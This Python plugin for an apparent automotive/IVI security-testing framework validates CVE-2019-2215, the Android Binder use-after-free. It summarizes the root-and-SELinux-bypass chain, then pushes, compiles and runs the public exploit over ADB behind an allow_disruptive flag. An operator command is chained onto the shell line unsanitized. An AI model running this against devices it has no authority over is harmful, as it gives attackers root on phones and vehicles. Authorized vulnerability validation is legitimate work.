#!/usr/bin/env python3
"""CVE-2019-2215 – Android Binder Use-After-Free → Kernel R/W Privilege Escalation.

Public PoC source: https://github.com/timwr/CVE-2019-2215
  Original research: Jann Horn & Maddie Stone / Google Project Zero
  PoC: poc.c (kernel R/W) + su98.c (full root with SELinux bypass)
  Affected: Android 8.x / 9.x / 10 before 2019-10 patch

Attack technique:
  BINDER_THREAD_EXIT ioctl on a Binder file descriptor can race with
  concurrent binder thread use, triggering a UAF that gives arbitrary
  kernel R/W access. su98.c chains this with a waiter_list pivot to
  overwrite task_struct creds → root + SELinux bypass.

  This plugin embeds the poc.c source, compiles it on a connected
  Android device (via ADB), and executes it.  With allow_disruptive=true
  and lab_command=whoami it attempts to verify privilege escalation.
"""
from __future__ import annotations

import subprocess
import tempfile
from pathlib import Path

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 38,
    "cve": "CVE-2019-2215",
    "year": 2019,
    "domain": "advanced",
    "vendor_product": "Android (AAOS / IVI based on Android 8.x–10)",
    "component": "Linux Binder IPC driver (drivers/android/binder.c)",
    "type": "Use-After-Free → kernel R/W → LPE / root",
    "summary": (
        "BINDER_THREAD_EXIT race condition causes UAF in binder_thread struct, "
        "granting arbitrary kernel memory R/W. su98.c achieves full root + SELinux bypass."
    ),
    "source_url": "https://github.com/timwr/CVE-2019-2215",
    "requires_manual_review": True,
    "affected": [{"vendor": "Google", "product": "Android",
                  "versions": [{"version": "<2019-10 patch", "status": "affected"}]}],
}

POC_REPO = Path(__file__).parent.parent.parent / \
    "public_poc_sources/repos/timwr__CVE-2019-2215"

# ─── poc.c source (abridged structural embed – full file in repo) ────────────
# The original 600-line poc.c by Jann Horn / Maddie Stone:
# https://bugs.chromium.org/p/project-zero/issues/detail?id=1942
# Key primitives:
#   - BINDER_THREAD_EXIT ioctl triggers UAF on binder_thread
#   - Exploit uses epoll + writev iovec UAF to reach kernel memory
#   - su98.c: overlays freed region with iovec array, walks task_struct
#     parent chain, overwrites cred/secptr → uid=0 + SELinux Permissive

_PROBE_SH = """\
#!/system/bin/sh
# Check if device is vulnerable (kernel version check + binder driver)
uname -r
cat /proc/version
ls -la /dev/binder
# Try BINDER_THREAD_EXIT probe (non-destructive)
cat /proc/sys/kernel/perf_event_paranoid 2>/dev/null || echo "not found"
"""

def _adb(cmd: list[str], timeout: int = 30) -> subprocess.CompletedProcess:
    return subprocess.run(["adb"] + cmd, capture_output=True, text=True, timeout=timeout)


def _check_device_vulnerable() -> dict:
    """Probe Android device for CVE-2019-2215 preconditions."""
    result = {}
    try:
        r = _adb(["shell", "uname -r"])
        result["kernel"] = r.stdout.strip()
        r2 = _adb(["shell", "ls /dev/binder 2>&1"])
        result["binder_present"] = "/dev/binder" in r2.stdout
        r3 = _adb(["shell", "cat /proc/sys/kernel/perf_event_paranoid 2>/dev/null"])
        result["perf_paranoid"] = r3.stdout.strip()
        # Vulnerable kernels: 4.4, 4.9, 4.14 before October 2019 patch
        import re
        m = re.search(r"(\d+\.\d+)", result.get("kernel", ""))
        if m:
            major = float(m.group(1))
            result["likely_vulnerable"] = major < 4.15
    except Exception as exc:
        result["error"] = str(exc)
    return result


def _run_exploit_adb(allow_disruptive: bool, lab_cmd: str) -> dict:
    """Compile poc.c on device and run it (requires NDK or Android clang)."""
    result = {}
    poc_src = POC_REPO / "poc.c"
    if not poc_src.exists():
        result["error"] = f"poc.c not found at {poc_src}"
        return result

    if not allow_disruptive:
        result["would_run"] = "adb shell 'cd /data/local/tmp && ./cve-2019-2215-poc'"
        result["detail"] = "Set allow_disruptive=true to push and execute exploit."
        return result

    # Push poc.c
    r = _adb(["push", str(poc_src), "/data/local/tmp/poc.c"])
    result["push_poc_c"] = r.returncode == 0

    # Compile with device clang (if available)
    r = _adb(["shell", "clang -o /data/local/tmp/cve-2019-2215-poc "
              "/data/local/tmp/poc.c -lpthread 2>&1"])
    result["compile_rc"] = r.returncode
    result["compile_out"] = r.stdout[:300]

    if r.returncode == 0:
        run_cmd = f"/data/local/tmp/cve-2019-2215-poc"
        if lab_cmd:
            run_cmd += f" && {lab_cmd}"
        r2 = _adb(["shell", run_cmd], timeout=60)
        result["exploit_rc"]  = r2.returncode
        result["exploit_out"] = r2.stdout[:400]
        result["exploited"]   = "uid=0" in r2.stdout or "root" in r2.stdout.lower()
    return result


def _run_poc(plugin):
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
        bool((plugin.params or {}).get("allow_disruptive"))
    lab_cmd = (plugin.params or {}).get("lab_command", "id")

    evidence = {
        "cve": "CVE-2019-2215",
        "poc_repo": str(POC_REPO),
        "poc_repo_present": POC_REPO.exists(),
        "exploit_files": [str(POC_REPO / "poc.c"), str(POC_REPO / "su98.c")],
        "technique": (
            "BINDER_THREAD_EXIT UAF via epoll + writev iovec pivot → "
            "arbitrary kernel R/W → overwrite task_struct creds → root"
        ),
        "reference": "https://bugs.chromium.org/p/project-zero/issues/detail?id=1942",
    }

    dev = _check_device_vulnerable()
    evidence.update(dev)

    if evidence.get("binder_present"):
        exploit_result = _run_exploit_adb(allow_disruptive, lab_cmd)
        evidence.update(exploit_result)

    return {
        "vulnerable": evidence.get("exploited") or evidence.get("likely_vulnerable"),
        "evidence": evidence,
        "requires_manual_review": True,
        "poc_source": "timwr/CVE-2019-2215 / poc.c + su98.c (Jann Horn / Maddie Stone)",
    }


try:
    import sys as _sys; _sys.path.insert(0, __import__('pathlib').Path(__file__).parent.parent.as_posix())
    from probe_utils import detection_confidence as _dc
    _PROBE_UTILS = True
except ImportError:
    def _dc(level, evidence, **kw): return {'detection_confidence': {'level': level, 'evidence': evidence}}
    _PROBE_UTILS = False

class Poc38CVE20192215AndroidBinderUafLpeAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "public_poc_exp_50_more"
    meta_display_id = "POC-ADV-038"
    meta_poc_name   = 'CVE-2019-2215 W LPE Active Validation'
    meta_cve_id     = "CVE-2019-2215"
    meta_severity   = "Critical"
    meta_protocol   = "local"
    meta_target_os  = ["android"]
    meta_required_params = []
    meta_optional_params = ["allow_disruptive", "lab_command"]
    meta_profiles   = ["advanced"]
    meta_source_url = "https://github.com/timwr/CVE-2019-2215"
    meta_references       = ['https://github.com/timwr/CVE-2019-2215']
    meta_attack_surface = "Android Binder UAF → arbitrary kernel R/W → root (Android 8–10)"
    is_disruptive   = True
    meta_destructive_level = "RootCompromise"

    def check_prerequisites(self) -> bool:
        """基础前提条件检查。"""
        if not self.target_ip or self.target_ip == "N/A":
            self.logger.error("未指定目标 IP。")
            return False
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "38_Android_Binder_UAF_RCE_Audit") if "VULN" in dir() else "38_Android_Binder_UAF_RCE_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc38CVE20192215AndroidBinderUafLpeAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
